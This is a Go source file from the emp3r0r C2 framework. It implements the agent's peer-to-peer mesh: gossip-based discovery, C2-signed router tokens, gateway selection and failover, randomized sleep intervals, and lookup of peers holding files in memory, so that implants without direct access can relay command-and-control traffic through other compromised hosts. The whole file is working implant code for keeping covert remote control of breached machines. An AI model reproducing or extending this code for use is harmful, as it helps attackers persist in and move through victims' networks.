// Package mesh implements the emp3r0r P2P mesh stack.
//
// Discovery: hashicorp/memberlist gossip (AES-encrypted, def.AESPassword).
// Authorization: C2-signed AgentToken (capability="router") verified ECDSA.
// Transport: KCP (pluggable via MeshTransport interface; see transport.go).
// Relay: bridge.go CONNECT_C2 opcode — Gateway pipes KCP stream to C2 TLS.
// Routing: shortest Distance (hops to C2) preferred.
package mesh

import (
	"context"
	"math/rand"
	"path/filepath"
	"strconv"
	"sync"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/hashicorp/memberlist"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

var (
	// myDistance is this node's current hop-count to C2.
	//  0  = Gateway (direct C2 access)
	// -1  = Unknown / Silent Node not yet routed
	// n>0 = Routed node (hops through n peers)
	myDistance     = -1
	myDistanceMu   sync.RWMutex
	localP2PPort   int
	localP2PPortMu sync.RWMutex
	gossipList     *memberlist.Memberlist
	gossipMu       sync.RWMutex
	gossipDelegate *transport.GossipDelegate

	// gatewayIP is the current best gateway IP for the Silent Node relay.
	// Protected by gatewayMu; updated by watchPeers whenever a better peer appears.
	// Set to "" when the current gateway is confirmed dead.
	gatewayIP  string
	gatewayMu  sync.RWMutex
	routeReady = make(chan struct{}) // closed once on first gateway found
	routeOnce  sync.Once

	// GatewayDeadCh receives a token whenever the active gateway becomes
	// unreachable. agent.go listens on this to drop and rebuild the HTTP client.
	// Buffer=1 so the send is non-blocking; the agent drains it when it reacts.
	GatewayDeadCh = make(chan struct{}, 1)

	// gatewayReadyCh receives a token whenever watchPeers confirms a live gateway.
	// Buffer=1 so producers never block; WaitForRoute drains it.
	gatewayReadyCh = make(chan struct{}, 1)
)

// SetLocalP2PPort sets the dynamic P2P server port for this agent.
func SetLocalP2PPort(port int) {
	localP2PPortMu.Lock()
	localP2PPort = port
	localP2PPortMu.Unlock()
}

// GetLocalP2PPort gets the dynamic P2P server port for this agent.
func GetLocalP2PPort() int {
	localP2PPortMu.RLock()
	defer localP2PPortMu.RUnlock()
	return localP2PPort
}

// SetDistance updates this node's advertised distance.
func SetDistance(d int) {
	myDistanceMu.Lock()
	myDistance = d
	myDistanceMu.Unlock()
}

func getDistance() int {
	myDistanceMu.RLock()
	defer myDistanceMu.RUnlock()
	return myDistance
}

// currentMeta returns the current MeshNodeMeta for gossip advertisement.
func currentMeta() *def.MeshNodeMeta {
	return &def.MeshNodeMeta{
		Token:    common.RuntimeConfig.MyAgentToken,
		Distance: getDistance(),
		P2PPort:  GetLocalP2PPort(),
		Files:    util.ListMemFiles(),
	}
}

// Start launches the full mesh service for this node.
func Start(ctx context.Context) {
	gossipPort := meshGossipPort()
	logging.Infof("Mesh: starting gossip on port %d (direct-c2=%v)", gossipPort, common.RuntimeConfig.IsDirectC2Enabled)

	list, err := transport.StartGossip(ctx, common.RuntimeConfig.AgentUUID, common.RuntimeConfig.InitialPeers, gossipPort, currentMeta)
	if err != nil {
		logging.Errorf("Mesh: gossip failed: %v — operating without peer discovery", err)
	} else {
		gossipMu.Lock()
		gossipList = list
		gossipDelegate = &transport.GossipDelegate{GetMeta: currentMeta}
		gossipMu.Unlock()
		logging.Infof("Mesh: gossip engine ready (%d initial peers)", len(common.RuntimeConfig.InitialPeers))
	}

	util.OnMemFSChanged = UpdateGossipMeta

	if common.RuntimeConfig.IsDirectC2Enabled {
		// Gateway: distance=0, serve relay.
		SetDistance(0)
	}

	// Always start the mesh relay service if P2P is enabled.
	// This allows non-direct-C2 nodes to serve as intermediate routers
	// once they receive an authorized 'router' token from the C2.
	go func() {
		defer func() {
			if r := recover(); r != nil {
				logging.Errorf("ServeRelay panic: %v", r)
			}
		}()
		ServeRelay(ctx)
	}()

	if !common.RuntimeConfig.IsDirectC2Enabled {
		// Silent Node: watch peers for an authorized Gateway.
		go watchPeers(ctx)
	}
}

// WaitForRoute blocks until a Silent Node has a confirmed Gateway IP.
// This is safe to call multiple times; after a gateway failure it will
// block again until watchPeers sets a new live gateway.
func WaitForRoute() string {
	logging.Infof("Mesh: waiting for route to C2...")
	// First call: block until routeReady is closed (first gateway ever found).
	<-routeReady
	// Subsequent calls (e.g. after failover): block on the ready channel.
	for {
		ip := GetGatewayIP()
		if ip != "" {
			logging.Infof("Mesh: route ready (gateway %s)", ip)
			return ip
		}
		// Block until watchPeers signals a new gateway is available.
		<-gatewayReadyCh
	}
}

// GetGatewayIP returns the current best gateway IP (may change if gossip updates).
// Returns "" if no gateway is known yet or the last known gateway is dead.
func GetGatewayIP() string {
	gatewayMu.RLock()
	defer gatewayMu.RUnlock()
	return gatewayIP
}

// UpdateGossipMeta triggers an immediate re-broadcast of this node's NodeMeta
// to the gossip cluster. Call this whenever the local state changes (e.g.
// after an AgentToken is received from C2).
func UpdateGossipMeta() {
	gossipMu.RLock()
	list := gossipList
	gossipMu.RUnlock()
	if list == nil {
		return
	}
	if err := list.UpdateNode(5 * time.Second); err != nil {
		logging.Debugf("Mesh: UpdateNode: %v", err)
	} else {
		logging.Debugf("Mesh: NodeMeta re-broadcast triggered")
	}
}

// Join attempts to join the gossip cluster using the provided peer addresses.
func Join(peers []string) {
	gossipMu.RLock()
	list := gossipList
	gossipMu.RUnlock()
	if list == nil {
		return
	}

	// Deduplicate against current members to avoid noise and redundant work.
	currentMembers := make(map[string]bool)
	for _, m := range list.Members() {
		currentMembers[m.Addr.String()] = true
	}

	newPeers := make([]string, 0)
	for _, p := range peers {
		if !currentMembers[p] {
			newPeers = append(newPeers, p)
		}
	}

	if len(newPeers) == 0 {
		return
	}

	if n, err := list.Join(newPeers); err != nil {
		logging.Debugf("Mesh: Join failed for %v: %v", newPeers, err)
	} else if n > 0 {
		logging.Infof("Mesh: Joined %d new peer(s) via C2 push", n)
	}
}

// signalGatewayDead sends a non-blocking notification that the current gateway is dead.
func signalGatewayDead() {
	select {
	case GatewayDeadCh <- struct{}{}:
	default: // already pending, don't block
	}
}

// ─── Silent Node peer watcher ─────────────────────────────────────────────────

func watchPeers(ctx context.Context) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("watchPeers panic: %v", r)
		}
	}()
	// Use RegistryTransport which handles the transport selection via config
	var t MeshTransport = RegistryTransport{}

	tryPeers := func() bool {
		gossipMu.RLock()
		list := gossipList
		gossipMu.RUnlock()
		if list == nil {
			return false
		}
		peers := transport.GetAuthorizedPeers(list, def.CapabilityRouter)
		logging.Debugf("Mesh: %d authorized peer(s) in gossip view", len(peers))
		if len(peers) == 0 {
			return false
		}

		bestDistance := peers[0].Distance
		bestPeers := make([]def.MeshNodeMeta, 0, len(peers))
		for _, p := range peers {
			if p.Distance != bestDistance {
				break
			}
			bestPeers = append(bestPeers, p)
		}

		currentIP := GetGatewayIP()
		if common.RuntimeConfig.PersistentRouter && currentIP != "" {
			currentFound := false
			for i, p := range bestPeers {
				if p.Addr == currentIP {
					bestPeers[0], bestPeers[i] = bestPeers[i], bestPeers[0]
					currentFound = true
					break
				}
			}
			if currentFound && len(bestPeers) > 1 {
				rand.Shuffle(len(bestPeers)-1, func(i, j int) {
					bestPeers[1+i], bestPeers[1+j] = bestPeers[1+j], bestPeers[1+i]
				})
			} else if !currentFound {
				rand.Shuffle(len(bestPeers), func(i, j int) {
					bestPeers[i], bestPeers[j] = bestPeers[j], bestPeers[i]
				})
			}
		} else if currentIP != "" && len(bestPeers) > 1 {
			filtered := make([]def.MeshNodeMeta, 0, len(bestPeers)-1)
			for _, p := range bestPeers {
				if p.Addr != currentIP {
					filtered = append(filtered, p)
				}
			}
			if len(filtered) > 0 {
				bestPeers = filtered
			}
			rand.Shuffle(len(bestPeers), func(i, j int) {
				bestPeers[i], bestPeers[j] = bestPeers[j], bestPeers[i]
			})
		}

		for _, p := range bestPeers {
			// Probe dial: verify the gateway is reachable.
			if err := t.Ping(ctx, p.Addr, ""); err != nil {
				logging.Debugf("Mesh: peer %s failed: %v", p.Addr, err)
				continue
			}
			SetDistance(p.Distance + 1)
			gatewayMu.Lock()
			prev := gatewayIP
			gatewayIP = p.Addr
			gatewayMu.Unlock()
			if prev != p.Addr {
				logging.Infof("Mesh: gateway updated %s → %s", prev, p.Addr)
			}
			// Signal WaitForRoute on first success.
			routeOnce.Do(func() { close(routeReady) })
			// Also wake any WaitForRoute callers waiting for a new gateway after failover.
			select {
			case gatewayReadyCh <- struct{}{}:
			default:
			}
			return true
		}
		return false
	}

	// checkCurrentGateway probes the currently cached gateway.
	// If it fails, clears the IP and signals the agent to re-establish C2.
	checkCurrentGateway := func() {
		ip := GetGatewayIP()
		if ip == "" {
			return // already cleared
		}
		if err := t.Ping(ctx, ip, ""); err != nil {
			logging.Warningf("Mesh: current gateway %s is unreachable (%v), clearing route", ip, err)
			gatewayMu.Lock()
			gatewayIP = ""
			gatewayMu.Unlock()
			SetDistance(-1)
			signalGatewayDead()
		} else {
			logging.Debugf("Mesh: current gateway %s is alive", ip)
		}
	}

	// Initial discovery
	for ctx.Err() == nil {
		if tryPeers() {
			break
		}
		interval := time.Duration(util.RandInt(3000, 10000)) * time.Millisecond
		logging.Debugf("Mesh: no gateway found yet, retrying in %v", interval)
		select {
		case <-ctx.Done():
			return
		case <-time.After(interval):
		}
	}

	// After first gateway is found, maintain it: health-check and re-discover
	// on a randomized schedule.
	for {
		// Randomized sleep
		util.TakeASnap()

		if ctx.Err() != nil {
			return
		}

		checkCurrentGateway()
		// If the gateway was just cleared, or periodically, try peers.
		if GetGatewayIP() == "" || util.RandInt(0, 5) == 0 {
			if !tryPeers() {
				logging.Warningf("Mesh: no reachable gateway found during re-discovery")
			}
		}
	}
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

func meshGossipPort() int {
	if p, err := strconv.Atoi(common.RuntimeConfig.MeshGossipPort); err == nil && p > 0 {
		return p
	}
	return 7946 // memberlist default
}

// GetPeersForFile returns a map of peerIP -> p2pPort for all gossip cluster peers
// that advertise having the requested file in their MemFS/local storage.
func GetPeersForFile(fileName string) map[string]int {
	gossipMu.RLock()
	list := gossipList
	gossipMu.RUnlock()
	if list == nil {
		return nil
	}

	memKey := "mem:///" + filepath.Base(fileName)
	baseName := filepath.Base(fileName)
	result := make(map[string]int)

	for _, m := range list.Members() {
		if m.Name == common.RuntimeConfig.AgentUUID {
			continue
		}
		if len(m.Meta) == 0 {
			continue
		}
		var meta def.MeshNodeMeta
		if err := cbor.Unmarshal(m.Meta, &meta); err != nil {
			continue
		}
		for _, f := range meta.Files {
			if f == fileName || f == memKey || filepath.Base(f) == baseName {
				port := meta.P2PPort
				if port <= 0 {
					if p, err := strconv.Atoi(common.RuntimeConfig.P2PRelayPort); err == nil && p > 0 {
						port = p
					}
				}
				if port > 0 {
					result[m.Addr.String()] = port
					break
				}
			}
		}
	}
	return result
}
